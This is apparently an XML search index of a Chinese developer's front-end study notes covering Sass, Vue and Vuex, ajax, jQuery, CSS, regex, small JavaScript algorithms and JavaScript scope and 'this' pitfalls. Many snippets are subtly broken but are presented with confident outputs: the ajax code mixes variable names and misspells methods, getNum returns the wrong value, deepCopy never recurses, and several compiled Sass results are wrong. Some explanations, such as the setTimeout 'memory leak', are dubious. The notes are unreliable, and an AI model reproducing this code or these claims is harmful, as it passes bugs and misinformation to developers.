6] 进程和线程的区别1234567一个程序至少有一个进程，一个进程至少有一个线程线程的划分尺度小雨进程，使得多线程程序的并发行高线程是独立调度的基本单位，进程是拥有资源的基本单位线程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率每个独立的线程有一个程序运行的入口，顺序执行序列和程序的出口线程不能独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制（从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统中并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配，这就是形成和线程的主要区别） 查看本机的ip地址在控制台输入：ipconfig 一次完成的http通信过程建立TCP连接 web浏览器向web服务器发送请求 web浏览器发送请求头信息 web服务器应答 web服务器应答头信息 web服务器向浏览器发送数据 web服务器关闭TCP连接 CDN，CDS，DNS的区别CDN：内容分发网络将缓存服务器分布到用户访问相对集中的地区或网络，在用户访问网络时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接相应用户请求]]></content>
  </entry>
  <entry>
    <title><![CDATA[vue 中使用 sass]]></title>
    <url>%2F2018%2F08%2F25%2Fsass%2F</url>
    <content type="text"><![CDATA[Sass 是一款强化 CSS 的辅助工具，它在 CSS 语法的基础上增加了变量 (variables)、嵌套 (nested rules)、混合 (mixins)、导入 (inline imports) 等高级功能 安装(mac下)以及使用 安装 12sudo cnpm install node-sass --save-devsudo cnpm install sass-loader --save-dev 使用 12&lt;style lang=&quot;scss&quot; scoped&gt; //scoped代表只在本页应用的样式&lt;/style&gt; 功能1. 嵌套css允许将一套css样式套进另一套样式中，内层的样式为外层样式的子选择器（1）普通嵌套 scss样式 123456789body &#123; background: red; div &#123; height: 30px; a&#123; display: block; &#125; &#125;&#125; 编译后的css样式 123456789body &#123; background: red;&#125;body div &#123; height: 30px;&#125;body div a&#123; display: block;&#125; （2）父选择器scss 用 &amp; 符号代表嵌套规则外层的父选择器 scss样式 123456a &#123; background: red; &amp;:hover &#123; text-decoration: underline; &#125;&#125; 编译后的css样式 123456a &#123; background: red;&#125;a:hover &#123; text-decoration: underline;&#125; （3）属性嵌套sass允许同一个属性嵌套在命名空间中 scss样式 123456a &#123; font &#123; size: 28px; weight: bold; &#125;&#125; 编译后的css样式 1234a &#123; font-size: 28px; font-weight: bold;&#125; （4）@import嵌套样式 scss样式 123456.text &#123; color: red;&#125;p &#123; @import &apos;text&apos;&#125; 编译后的css样式 123p .text&#123; color: red;&#125; 2. 变量 $变量支持块级作用域，嵌套内定义的变量成为局部变量，只能在当前嵌套内使用，在顶层定义的变量成为全局变量，可以在所用地方使用 !global 可以将局部变量转换为全局变量，用于结尾 scss样式 1234567div &#123; $width: 100px !global; width: $width;&#125;.container &#123; width: $width;&#125; 编译后的css样式 123456div &#123; width: 100px;&#125;.container &#123; width: 100px;&#125; !default 默认变量，不会重新赋值已经赋值的变量，但是没有赋值的变量会赋予值 scss样式 123456789$content: &apos;a little pain&apos;$content: &apos;much pain&apos; !default$value: &apos;lover&apos;p:before &#123; content: $content&#125;a:before&#123; content: $value&#125; 编译后css样式 123456p:before &#123; content: a little pain&#125;a:before&#123; content: &apos;lover&apos;&#125; 3. 字符串 使用#{}时，有引号字符串将被编译为无引号字符串，这样便于在，，mixin中引用选择器名 scss样式 123456@mixin firefox-message($selector) &#123; body.content #&#123;$selector&#125;:before &#123; content: &apos;hi&apos; &#125;&#125;@include firefox-message(&apos;.header&apos;) 编译后的css样式 123body.content .header:before&#123; content: &apos;hi&apos;&#125; 4. 运算 scss样式 123p &#123; font-size: 20px + 10px/2&#125; 编译后的css样式 123p &#123; font-size: 25px;&#125; 5. 插值语句通过#{} 插值语句可以在选择器或属性名中使用变量 scss样式 12345$name: pig$p: paddingp .$name &#123; $p-left: 20px;&#125; 编译后的css样式 123p .pig&#123; padding-left: 20px;&#125; 6. extend继承@extend 的作用是将重复使用的样式延伸给需要包含这个样式的特殊样式 scss样式 12345678$p: paddingp &#123; $p-left: 20px;&#125;div&#123; @extend p border: 1px solid #aaa;&#125; 编译后的css样式 123456p , div &#123; padding-left: 20px;&#125;div&#123; border: 1px solid #aaa;&#125; 7. 控制指令（1）@if scss样式 12345p &#123; @if 1 + 1 == 2 &#123; border: 1px solid #aaa; &#125;&#125; 编译后的css样式 123p &#123; border: 1px solid #aaa;&#125; （2）@for scss样式 12345@for $i from 1 through 3 &#123; .item-#&#123;$i&#125; &#123; width: 2em * $i; &#125;&#125; 编译后的css样式 123456789.item-1 &#123; width: 2em;&#125;.item-2 &#123; width: 4em;&#125;.item-3 &#123; width: 6em;&#125; （3）@each scss样式 12345@each $header, $value in (h1: red, h2: blue) &#123; $header &#123; color: $value &#125;&#125; 编译后的css样式 123456h1 &#123; color: red;&#125;h2 &#123; width: blue;&#125; 8. 混合指令混合指令用于定义可重复使用的样式，避免了使用无语意的 class （1）定义混合样式@mixin scss样式 1234567@mixin font-value &#123; font &#123; size: 12px; weight: bold; &#125; color: #fff;&#125; （2）引用混合样式@include scss样式 1234p &#123; @include font-value background: red;&#125; 编译后的css样式 123456p &#123; font-size: 12px; font-weight: bold; color: #fff; background: red;&#125; （3）混合样式带参数 普通参数 sass 1234567891011@mixin args ($color) &#123; font &#123; size: 12px; weight: bold; &#125; color: $color&#125;p &#123; @include args(#fff) background: red;&#125; 编译后的css样式 123456p &#123; font-size: 12px; font-weight: bold; color: #fff; background: red;&#125; 默认参数 sass 12345678910111213@mixin args ($color, $value: 12px) &#123; font &#123; size: $value; weight: bold; &#125; color: $color&#125;p &#123; @include args(#fff, 13px)&#125;a &#123; @include args(red)&#125; 编译后的css样式 12345678910p &#123; font-size: 13px; font-weight: bold; color: #fff;&#125;a &#123; font-size: 12px; font-weight: bold; color: red;&#125; 参数变量 sass 123456@mixin args ($shadow...) &#123; box-shadow: $shadow...&#125;p &#123; @include args(2px 3px 2px #000)&#125; 编译后的css样式 123p &#123; box-shadow: 2px 3px 2px #000;&#125; （4）在混合指令中导入内容@content scss样式 12345678910@mixin name &#123; * html &#123; @content &#125;&#125;@include name &#123; body &#123; background: red; &#125;&#125; 编译后的css样式 123* html body &#123; background: red;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[从零开始自学微信小程序之路]]></title>
    <url>%2F2018%2F08%2F16%2Fwechat%2F</url>
    <content type="text"><![CDATA[1. 使用/安装 配置：在微信公众平台申请小程序账号，下载微信开发者工具，本地创建项目文件夹，并输入appid和项目名称，进入小程序项目WeUI-wxss安装使用：WeUI-wxss是一套同微信原生视觉体验一致的基础样式库,设计规范参考https://github.com/weui/weui-design 123https://github.com/Tencent/weui-wxss下载到本地（git clone https://github.com/Tencent/weui-wxss.git）将weui-wxss/dist/style/weui.wxss放到小程序项目的根目录下在项目中引用：在全局app.wxss中加入weui.wxss的引用- @import &quot;weui.wxss&quot;;]]></content>
  </entry>
  <entry>
    <title><![CDATA[jquery知识点]]></title>
    <url>%2F2018%2F08%2F11%2Fjquery%2F</url>
    <content type="text"><![CDATA[1.属性拷贝 浅拷贝(只复制一份原始对象的引用) 1var newObj = $.extend(&#123;&#125;, oldObject) 深拷贝(对原始对象属性所引用的对象进行递归拷贝) 1var newObj = $.extend(true, &#123;&#125;, oldObject)]]></content>
  </entry>
  <entry>
    <title><![CDATA[ajax小记]]></title>
    <url>%2F2018%2F08%2F11%2Fajax%2F</url>
    <content type="text"><![CDATA[1.ajax实现的步骤123456创建XMLHttpRequest对象创建一个新的HTTP请求，并指定该请求的类型和验证信息设置相应请求状态变化的回调函数发送http请求获取异步调用返回的数据使用javascript和dom进行局部刷新 2.ajax实现的代码123456789var xtr = new XMLHttpRequest()xtr.open(&apos;POST&apos;, url , true)xtr.setRequertHeader(&apos;Content-Type&apos;, &apos;application/x-www-form-urlencoded&apos;)xtr.onreadystatechange = function () &#123; if (xhr.readyState == 4 &amp;&amp; (xhr.readyState == 200 || xhr.status == 304)) &#123; fn.call(this, xhr.responseText) &#125;&#125;xtr.send(data)]]></content>
  </entry>
  <entry>
    <title><![CDATA[Vuex实现存储用户登录后的用户信息，方便在各个页面中使用]]></title>
    <url>%2F2018%2F07%2F05%2Fvuex%2F</url>
    <content type="text"><![CDATA[1. 安装vuexnpm install vuex --save-dev 2. 建立全局store1.在src文件夹下，新建文件夹（一般我们取名store），并在该文件夹下创建存储数据的js文件。2.在main.js文件下，我们需要将存储的数据文件设置为全局形式，方便引用1234567import store from &apos;./你新建的文件夹文字/你文件夹下的文件名字&apos;new Vue(&#123; el: &apos;#app&apos;, router, store, //这里不要忘记咯 render: h =&gt; h(App)&#125;) 3. 编写js文件1. 在这里，我们要先定义我们的state，用来装所需要存储的数据，初始值是空。12345const state = &#123; user: &#123; &#125;&#125; 2. 接下来我们定义mutation，编写我们要改变的事件，去接受值，参数为两个，一个是state，一个是payLoad（就是我们要存储的所有数据）12345const mutations = &#123; setUserInfo(state, payload) &#123; state.user = payload //现在我们把存储的值都放在state的user对象下 &#125;&#125; 3. 将我们的state和mutation暴漏出去，用于全局引用1234export default new Vuex.Store(&#123; state, mutations&#125;) 4. 登录存储在我们获取登录接口并且服务器返回成功后，进行数据存储 1this.$store.commit(&apos;setUserInfo&apos;, &#123;data:rep.data.data&#125;) 5.调用存储数据1this.$store.state.user//输出结果就是我们存储进去的信息]]></content>
  </entry>
  <entry>
    <title><![CDATA[Vue小记知识点]]></title>
    <url>%2F2018%2F06%2F21%2Fvue%2F</url>
    <content type="text"><![CDATA[1. this.$router.go(0) 重新刷新加载页面2. 使用element-ui的日期组件时，如果只是绑定v-model给日期组件，v-model接收的时间为正常时间-1天 解决办法，设置value-format！！！！，文档上写的是value属性，当时小坑了一下 1:value-format=&quot;yyyy-MM&quot; 3. axios下关于put/get/delete/post请求的三种传参方式（1）get/put/delete/post关于path传参方式12345this.$axios.get(&quot;/hospital/ruleDicts/&quot; + 参数) .then(() =&gt; &#123; &#125;) .catch((err) =&gt; &#123; &#125;) （2）get/put/delete/post关于body传参方式12345678that.$axios.put(&quot;/hospital/updateRule/&quot;, &#123; 字段1: 参数值， 字段2: 参数值 &#125;) .then(() =&gt; &#123; &#125;) .catch((err) =&gt; &#123; &#125;) （3）get/put/delete/post关于query传参方式12345that.$axios.put(&quot;/hospital/updatePackageName/&quot;?参数字段=&quot;+参数值) .then((res)=&gt;&#123; &#125;,(err)=&gt;&#123; &#125;).catch((error)=&gt;&#123; &#125;) 4. bus.js实现兄弟之间组件通信（官方文档中只提供了父与子通信） 在文件夹中新建一个文件，随意取名，例如bus.js放在了assets文件夹（文件夹自定义）下，在bus.js文件夹下写入： import Vue from &apos;vue&apos; export default new Vue() 在两个要通信的兄弟组件之间引入bus.js import bus from &apos;你bus.js文件存放的位置&apos; 想要传递信息的兄弟1 &lt;button @click=&quot;toBus&quot;&gt;&lt;/button&gt; methods: { toBus () { bus.$emit(&apos;on&apos;, &apos;这个是兄弟1传给兄弟2的值&apos;) } } 接受传递信息的兄弟2 mounted () { bus.$on(&apos;on&apos;, (msg) =&gt; { console.log(msg) // msg就是从兄弟1接到的数据 }) } 5.keep-alive用法应用场景：我们在某一个筛选列表页面，需要点击进入列表的详情页，但是我们希望返回时，仍记录我们的选择项，此时我们可以采用keep-alive进行设置，对页面进行缓存，用法如下： 在主页面使用router-view组件的app.vue中设置 &lt;keep-alive&gt; &lt;router-view v-if=&quot;$route.meta.keepAlive&quot;&gt;&lt;/router-view&gt; &lt;/keep-alive&gt; &lt;router-view v-if=&quot;!$route.meta.keepAlive&quot;&gt;&lt;/router-view&gt; 在router.js中配置你想进行缓存的页面路由 { path: &apos;/page1&apos;, // 假设我们现在需要缓存的页面的名字叫做page1 name: &apos;Page1&apos;, component: Page1, meta: { keepAlive: true // 需要被缓存 } }]]></content>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 知识点]]></title>
    <url>%2F2018%2F06%2F21%2Fjs%2F</url>
    <content type="text"><![CDATA[概念知识点1. JavaScript 实现由 (核心：ECMAScript；文档对象模型：DOM；浏览器对象模型：BOM) 构成。2. 浏览器窗口功能以及navigator对象/location对象/screen对象，对cookie/XMLHttpRequest/ActiveXObject的支持均属于BOMnavigator对象包含有关浏览器的信息，例如：版本appVersion, 名称appName, 操作系统平台platform等 location对象包含有关当前URL的信息，常用：window.location.href获取当前地址或者改变新的地址/window.location.reload()重新加载当前页面 screen对象包含有关客户端显示屏幕的信息，例如：window.screen.height返回屏幕的总高度 3.NaN与任何值都不相等，并且涉及到NaN操作时，均为NaN4.++/– –,++前置时，先运算再赋值 1234var num1 = 10var num2 = 20var num3 = --num1 + num2 =&gt; num3 = 29var num4 = num1 + num2 =&gt; num4 = 29 –,++后置时，先赋值再运算 1234var num1 = 10var num2 = 20var num3 = num1-- + num2 =&gt; num3 = 30var num4 = num1 + num2 =&gt; num4 = 29 5.函数中return后面的语句不会被执行1234function test () &#123; return; alert(1)//alert提示框永远不会弹出&#125; 6.深浅克隆(原生js，也可参考jquery文档下的克隆) 浅克隆（简单的复制对象，如果对象其中一个属性是引用型变量，就会出现负值增生的情况，因为引用型变量保存的是内存地址，所以其实后来操作的都是同一块内存，导致了数组内容都一样。） 1234567891011121314151617var objTemplate = &#123; name: &apos;pig&apos;, username: &apos;杨欣舰&apos;, tag: [&apos;淑女&apos;]&#125;//obj 为初始值对象function simpleCopy (obj) &#123; var newobj = &#123;&#125; for (var i in obj) &#123; newobj[i] = obj[i] &#125; return newobj&#125;var userboy = simpleCopy(objTemplate)userboy.name = &apos;小龙龙&apos;userboy.username = &apos;龙宝&apos;userboy.tag.push(&apos;亲爱的&apos;) 深度克隆（深克隆就是在克隆的时候判断一下属性的类型是不是引用型变量，如果是的话就用递归方法让它一层一层进去复制自己。） 123456789101112function deepCopy (obj, newobj) &#123; var newobj = newobj || &#123;&#125; for (var i in obj) &#123; if (typeof obj[i] == &apos;Object&apos;) &#123; newobj[i] = (obj[i].construtor === Array) ? [] : &#123;&#125; deepCopy(obj[i], newobj[i]) &#125; else &#123; newobj[i] = obj[i] &#125; &#125; return newobj&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[css小技巧]]></title>
    <url>%2F2018%2F06%2F14%2Fcss%2F</url>
    <content type="text"><![CDATA[1.元素居中(1) 块状元素居中1234.box &#123; width: 100px; margin: o auto;&#125; (2) 浮动元素居中（不提倡）123456789.box &#123; position: absolute; width: 100px; height: 100px; left: 50%; top: 50%; margin-left: -50px; margin-top: -50px;&#125; (3) flex元素居中（超级实用）12345.box &#123; display: flex; justify-content: center; 一行下的水平居中 align-items: center; 多行的竖直居中&#125; 2.伪类####（1）相同class的index检索 123456:last-child 检索最后一个值:first-child 检索第一个值:nth-child(index) 从头开始检索index个值，index初始值为1:nth-last-child(index) 从尾开始检索index个值，index为1默认倒数第一个（这个比较坑）:nth-child(odd) 检索基数:nth-child(even) 检索偶数 找出倒数第几个的样式，这个伪类还是很帅气的，之前写一个项目，li下面又放了一个标签，怎么调节li最后一个都不变，但是因为li有同级最后，那就不是最后一个元素，后来使用nth-last-child(2)就弄好了 ####（2）::before写出小三角 .box{ position: relative; left:100px; width: 140px; min-height: 70px; background: #f6dbd8; -moz-border-radius: 12px; -webkit-border-radius: 12px; border-radius: 12px; padding: 5px 10px; word-wrap: break-word; } .box:before{ 三角形区域 position: absolute; content: &quot;&quot;; width: 0; height: 0; right: 100%; top: 38px; border-top: 13px solid transparent; border-right: 26px solid #f6dbd8; border-bottom: 13px solid transparent; } 3.去除input标签默认点击边框outline: none; 4.编写一个小三角1234567.demo&#123; width: 0; height: 0; border-width: 20px; border-style: solid; border-color: transparent tansparent red transparent;&#125; 5.box-sizing box-sizing: content-box; //默认的标准盒模型元素效果（w3c）box-sizing: border-box; //默认的怪异盒模型元素效果（ie）box-sizing: inherit; //继承父元素box-sizing的属性值 6.移动端适配css插件 – cssrem（vscode下安装步骤）1. 在vscode的扩展商店，搜索cssrem 2. 点击安装，安装后，点击重新加载 3. 加载完成后，打开设置，在右边配置输入中，可以设置转换长度，&quot;cssrem-rootFontSize&quot;]]></content>
  </entry>
  <entry>
    <title><![CDATA[常用正则表达式]]></title>
    <url>%2F2018%2F05%2F21%2Fzhengze%2F</url>
    <content type="text"><![CDATA[简单语法糖123456&apos;^&apos;放在开头，验证是否以...开头&apos;$&apos;放在结尾，验证是否以...结尾&apos;[]&apos;验证出现过的字符&apos;()&apos;验证出现过的字符串&apos;-&apos;连接符，常用[a-z],[A-Z],[0-9],[\u4e00-\u9fa5]&apos;^&apos;放到中间，代表不包含 使用const ZHENG = /^a/ const str = &apos;aaaaooo&apos; console.log(ZHENG.test(str)) 控制台输出：true 经典验证1.验证数字 ^[0-9]*$ 2.验证n位的数字(字符串内容为纯数字的也支持) ^\d{n}$ 3.验证至少n位的数字(字符串内容为纯数字的也支持) ^\d{n,}$ 4.验证m-n位的数字（字符串内容为纯数字的也支持） ^\d{m,n}$ 5.0和非0开头的数字 ^(0|[1-9][0-9]*)$ 6.汉字 ^[\u4e00-\u9fa5]{0,}$ 7.长度为m-n的所有字符 ^.{m,n}$ 8.以字母数字下划线开头的字符串 ^[A-Za-z0-9_]$ 9.Email地址 ^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$ 10.空格 /\s*/g]]></content>
  </entry>
  <entry>
    <title><![CDATA[JS常用功能小算法]]></title>
    <url>%2F2018%2F05%2F21%2Fmethod%2F</url>
    <content type="text"><![CDATA[字符串1.为字符串每一个字符中插入其他字符(举例子：每一个字符之间插入空格)1234function test (str) &#123; return str.split(&apos;&apos;).join(&apos; &apos;)&#125;console.log(test(&apos;hello pig&apos;)) 控制台输出：h e l l o p i g 2.数组去重 es6方法 12345function uni (arr) &#123; return Array.from(new Set(arr))&#125;var _arr = [&apos;1&apos;, 22, &apos;aa&apos;, &apos;1&apos;, 33, 33]console.log(uni(_arr)) 再简单一点 12const a = arr =&gt; [...new Set(arr)]console.log(a([&apos;1&apos;, 22, &apos;aa&apos;, &apos;1&apos;, 33, 33])) 控制台输出：[‘1’, 22, ‘aa’, 33] es5方法 12345678var arr = [1, 3, 4, 4, 2, 3, 1]var arr1 = []for (var i = 0; i &lt; arr.length; i++) &#123; if (arr1.indexof(arr[i]) &lt; 0) &#123; arr1.push(arr[i]) &#125;&#125;console.log(arr1) 控制台输出[1, 3, 4, 2] 3.数组并集1234u (a, b) &#123; return Array.from(new Set([..a, ..b]))&#125;console.log(u ([1,2,3,2,1], [3,2,1,5])) 控制台输出 [1,2,3,5] 4.数组交集1234n (a, b) &#123; return Array.from(new Set([...a].filter(x =&gt; new Set(b).has(x))))&#125;console.log(u ([1,2,3,2,1], [3,2,1,5])) 控制台输出 [1,2,3] 5.数组差级123cha (a, b) &#123; return [...a.filter(x =&gt; !new Set (b).has(x)), ...b.filter(x =&gt; !new Set (a).has(x))]&#125; 控制台输出 [5] 6.对应转换（举例数字月份转换成文字月份）123var mapTree = new Map([[&apos;01&apos;,&apos;一月&apos;],[&apos;02&apos;,&apos;二月&apos;],[&apos;03&apos;,&apos;三月&apos;],[&apos;04&apos;,&apos;四月&apos;],[&apos;05&apos;,&apos;五月&apos;],[&apos;06&apos;,&apos;六月&apos;],[&apos;07&apos;,&apos;七月&apos;],[&apos;08&apos;,&apos;八月&apos;],[&apos;09&apos;,&apos;九月&apos;],[&apos;10&apos;,&apos;十月&apos;],[&apos;11&apos;,&apos;十一月&apos;],[&apos;12&apos;,&apos;十二月&apos;]])console.log(mapTree.get(&apos;01&apos;)) 控制台输出 一月 7.检测一个变量是否为某一个类型(三种方式)123typeof(obj) === &apos;string&apos;typeof obj === &apos;string&apos;obj.constructor === &apos;string&apos; 8.去掉字符串的空格（1）正则+replaceconst str = &apos; a a a f &apos; str = str.replace(/\s*/g, &apos;&apos;) console.log(str) 控制台输出：aaaf （2）trim()const str = &apos; a a a f &apos; console.log(str.trim()) 控制台输出：a a a f(trim无法去掉中间的空格) 9.将某个字符串改写成驼峰形式（独立单词首字母大写）1234567let str = &apos;get-element-by-id&apos;let target = &apos;&apos;let arr = str.split(&apos;-&apos;)arr.forEach((item) =&gt; &#123; target += item.substr(0, 1).toUpperCase() + item.substr(1)&#125;)console.log(target) 控制台输出：GetElementById 10.随机抽取n个10-100的数12345678getNum (n) &#123; var arr = [] for (let i = 0; i &lt; n ; i ++) &#123; arr.push(parseInt(Math.random() * 90 + 10)) &#125; return n&#125;getNum(10) 控制台输出10个10-100之间的数字 找出数组中的最大差值123456789var arr = [1,3,13,234,234,11,334]var minNum = arr[0]var maxCha = 0arr.forEach((item) =&gt; &#123; minNum = Math.min(minNum, item) let cha = item - minNum maxCha = Math.max(maxCha, cha)&#125;)console.log(maxCha) 控制台输出： 333 计算一个整数的阶乘12345678add (n) &#123; if (n == 1) &#123; return 1 &#125; else &#123; return n * add(n-1) &#125;&#125;console.log(add(5)) 控制台输出 120]]></content>
  </entry>
  <entry>
    <title><![CDATA[JS常见的‘坑’]]></title>
    <url>%2F2018%2F05%2F17%2Fjs_keng%2F</url>
    <content type="text"><![CDATA[ES6小坑1.ES6为参数提供了默认值，在定义函数的同时初始化了这个参数，以便在参数没有被传递进去使用123function test (arg = 100) &#123; console.log(num)&#125; test(0) =&gt; 0test() =&gt; 100test(200) =&gt; 200 相对于ES5，arg = arg || 100这样设置参数默认值的时候，传入0时，就会输出false 2.ES6重构代码第一题： var jsonParse = require(&apos;body-parser&apos;).jsonParse import { jsonParse } from ‘body-parser’ 第二题： var body = request.body var username = body.username var password = body.password const {body, body: { username , password} } = request 3.‘…’ 组装对象或者数组 12const color = [&apos;red&apos;, &apos;yellow&apos;, &apos;blue&apos;]const colorful = [...color, &apos;green&apos;, &apos;pink&apos;] colorful =&gt; [‘red’, ‘yellow’, ‘blue’, ‘green’, ‘pink’] 12const people = &#123; name: &apos;pig&apos;, sex: &apos;female&apos;&#125;const newpeople = &#123; ...people, age: &apos;18&apos;&#125; newpeople =&gt; { name: ‘pig’, sex: ‘female’, age: ‘18’} 获取数组或者对象中除了前几项的其他项或者除了某项中的其他项 12const number = [1, 2, 3, 4, 5]const [first, ...rest] = number rest =&gt; 2, 3, 4, 5 12const user = &#123; name: &apos;pig&apos;, age: &apos;18&apos;, sex: &apos;female&apos;&#125;const &#123; name, ...rest &#125; = user rest =&gt; { age: ‘18’, sex: ‘female’ } 组合新对象，当两个对象合并有重复的时候，右面的属性名覆盖左面属性名 123const first = &#123; a: 1, b: 2, c: 3&#125;const second = &#123; c: 6, d: 4, e: 5&#125;const tatol = &#123; ...fisrt, ...second &#125; total =&gt; { a: 1, b: 2, c: 6, d: 4, e: 5} 4.promise12345678910111213setTimeout ( () =&gt; &#123; console.log(1) &#125;,0) new Promise ( (resolve) =&gt; &#123; console.log(2) for (var i = 0; i &lt; 10000; i++) &#123; i == 9999 &amp;&amp; resolve() &#125; console.log(3) &#125;).then(() =&gt; &#123; console.log(4) &#125;) console.log(5) 控制台输出：2，3，5，4，1 这道题主要为js的运行机制，首先setTimeout，设置了一个定时，定时结束后才会将这个函数放到任务队列里面，所以最后输出 promise的函数均是立即执行，所以直接输出2，3 then放到当前的tick最后，所以先输出5后在输出4，最后的定时的1 1234567891011const promise = new Promise((resolve, reject) =&gt; &#123; resolve(&apos;success1&apos;) reject(&apos;error&apos;) resolve(&apos;success2&apos;) &#125;) promise.then((res) =&gt; &#123; console.log(&apos;then: &apos;, res) &#125;) .catch((err) =&gt; &#123; console.log(&apos;catch: &apos;, err) &#125;) 控制台输出：then：success1 promise只会识别一种状态，当识别到了resolve状态时，后面的状态就忽略了，resolve代表成功，所以走的是then，输出success1 JS小坑1.循环，闭包，加延时123for (var i = 0; i &lt; 5; i ++) &#123; console.log(i)&#125; 输出：0，1，2，3，4 正常输出值 12345for (var i = 0; i &lt; 5; i++) &#123; setTimeout( () =&gt; &#123; console.log(i) &#125;, 1000 * i)&#125; 输出：5，5，5，5，5 因为for循环是一次性走完的，但是添加了异步的操作，当for循环结束后，i的作用域还存在，而且在他的内部还可以访问，所以就等于5了 1234567for (var i = 0; i &lt; 5; i++) &#123; ((i) =&gt; &#123; setTimeout(() =&gt; &#123; console.log(i) &#125;, i * 1000) &#125;)(i)&#125; 输出：0，1，2，3，4 添加了闭包操作，没执行一次i循环，就会一秒后输出i值 1234567for (var i = 0; i &lt; 5; i++) &#123; (() =&gt; &#123; setTimeout(() =&gt; &#123; console.log(i) &#125;, i * 1000) &#125;)(i)&#125; 输出：5，5，5，5，5 添加了闭包操作，但是（）内没有添加闭包值，没有对i保持引用，所以还是输出5 12345for (var i = 0; i &lt; 5; i++) &#123; setTimeout(((i) =&gt; &#123; console.log(i) &#125;)(i), i * 1000)&#125; 立即输出，没有延时：0，1，2，3，4 setTimeout这里传递了一个立即执行函数，所以后面的延时时间不进行考虑，所以立即输出0，1，2，3，4 2.循环，闭包（1）循环 123456789101112131415test6 () &#123; var results = this.count(); var f1 = results[0]; var f2 = results[1]; var f3 = results[2];&#125;,count() &#123; var arr = []; for (var i = 1; i &lt;= 3; i++) &#123; arr.push(function () &#123; return i * i; &#125;); &#125; return arr;&#125; f1 =&gt; function () { return i * i } f2 =&gt; function () { return i * i } f3 =&gt; function () { return i * i } f1() =&gt; 16 push的时候只是定义了函数，在执行时，i已经变成了4 f2() =&gt; 16 f3() =&gt; 16 （2）将（1）中的循环改成闭包 123456789101112131415161718test6 () &#123; var results = this.count(); var f1 = results[0]; var f2 = results[1]; var f3 = results[2];&#125;,count() &#123; var arr = []; for (var i = 1; i &lt;= 3; i++) &#123; arr.push((function(n)&#123; return function () &#123; return n * n; &#125; &#125;)(i)); // console.log(i) &#125; return arr;&#125; f1 =&gt; function () { return n * n } f2 =&gt; function () { return n * n } f3 =&gt; function () { return n * n } f1() =&gt; 1 f2() =&gt; 4 f3() =&gt; 9 (3) 将（1）中的var改成let时，var的作用域是在count下，let转换成块级作用域，所以在for循环{}下，所以当我们在var的基础上执行函数count，作用域变成了结束循环的i值，而let的作用域保持在每一次循环的i 123456789101112131415161718test6 () &#123; var results = this.count(); var f1 = results[0]; var f2 = results[1]; var f3 = results[2]; console.log(f1()) console.log(f2()) console.log(f3())&#125;,count() &#123; var arr = []; for (let i = 1; i &lt;= 3; i++) &#123; arr.push(function () &#123; return i * i; &#125;); &#125; return arr;&#125; 3.延时setTimeout（1）队列执行 123456var flag = truesetTimeout ( () =&gt; &#123; flag = false&#125;, 1000)while(flag) &#123;&#125;alert(&apos;1&apos;) 永远不会弹出1，因为在while中是死循环，虽然setTimeout只延时了一秒执行，但是主队列中的while会永远的执行下去，所在settimeout的队列永远不会被执行，代码阻塞在while循环这面（2）内存泄漏 123456789setTimeout (function test1 () &#123; var a = 1 console.log(`a:$(a)`)&#125;,0)setTimeout ((function test2 () &#123; var b = 1 console.log(`b:$&#123;b&#125;`)&#125;).toString(), 0) 两个定时延时，第一个传入的参数是函数，函数回调之后，test1（）函数被摧毁，内存被释放 第二传入的参数是字符串，会被解析成eval（string），他是一个全局变量函数，不存在被摧毁，始终占据内存，造成了内存泄漏。 4.this(1)在return中返回 1234567function getName() &#123; this.name = 1 return &#123;&#125;&#125;var a = new getName()console.log(a)console.log(a.name) 控制台输出 {} , undifined return返回的是一个空对象，所以new也是为空 123456function getName () &#123; this.name = 1 return 2&#125;var d = new getName()console.log(d.name) 控制台输出 1 return返回的是一个非空对象，所以new实例getName()方法 （2）this被谁调用就指向谁 12345678910111213var x = 0 var foo = &#123; x: 1, bar: &#123; x: 2, baz: function () &#123; console.log(this.x) &#125; &#125;&#125;var a = foo.bar.bazfoo.bar.baz()a() 控制台输出 2 0 baz()是被bar调用，所以this指向bar中的x2 a()是被windows调用，所以指向windows下的x0 1234567891011var x = 0function foo () &#123; var x = 1 function baz()&#123; console.log(this.x) &#125; return baz&#125;var a = foo()foo()()a() 控制台输出 0 0 foo()()是函数调用，是全局的指向，所以是windows下的x0 a()是被windows调用，所以指向windows下的x0 (3) new实例对象中的this 1234567var name = &apos;yang&apos;function person() &#123; this.name = &apos;zhu&apos;&#125;var a = new person()console.log(a.name)console.log(name) 控制台输出 zhu yang a重新实例了person对象，所以this指向当前对象下的值 （4）apply 12345678910var x = 0function test() &#123; console.log(this.x)&#125;var o = &#123;&#125;o.x = 1o.m = testo.m()o.m.apply()o.m.apply(o) 控制台输出 1 0 1 o里面新添入x属性和m属性，m属性赋值一个函数，m属于o，当o.m()的时候，m是被o调用的，所以m里面的this指向是o里面的x，也就是1 o.m.apply(),apply的作用是给函数设置一个this指向,当传入的参数没有，或者为null或者undifined的时候，指向全局，所以相当于在windows下调用，所以this指向x0 apply()中参数存在，指向o中的x为1 （5）闭包中的this 12345678910111213var x = 0var foo = &#123; x: 1, bar: function ()&#123; console.log(this.x) var that = this return function () &#123; console.log(this.x) console.log(that.x) &#125; &#125;&#125;foo.bar()() =》 let bar = foo() bar() 控制台输出 1 0 1 第一个（）输出的值是foo调用，所以是1 闭包返回的this调用的不是对象而是下一个函数，所以指向的是全局，所以是0 闭包返回的that是接受了上一步的this，所以是1 5.自执行12345678var z = 10;function foo() &#123; console.log(z)&#125;(function (funArg)&#123; var z = 20; funArg ()&#125;)(foo) 控制台输出： 10 因为下面的自执行是传入的foo这个函数，然后里面调用了这个函数，他能拿到的作用域只有外部的，里面的z不管他的事儿 6.变量123456789var a = 100function function_name(argument) &#123; var b = 2 * a var a = 200 var c = a / 2 alert(b) alert(c)&#125;function_name() alert弹出，NaN , 100 因为在函数内部，会在内部先找a，找不到a就会去外面寻找，当执行的时候，会查询当前作用域的变量，但不会立即赋值，简单来说：函数执行时，在{}内部产生一个作用域，查找该{}内的所有变量，函数名，常量这些，如果找不到，才会去外面找对应的，变量的提升就是，变量在申明之前也可以使用，但是值是undefined]]></content>
  </entry>
  <entry>
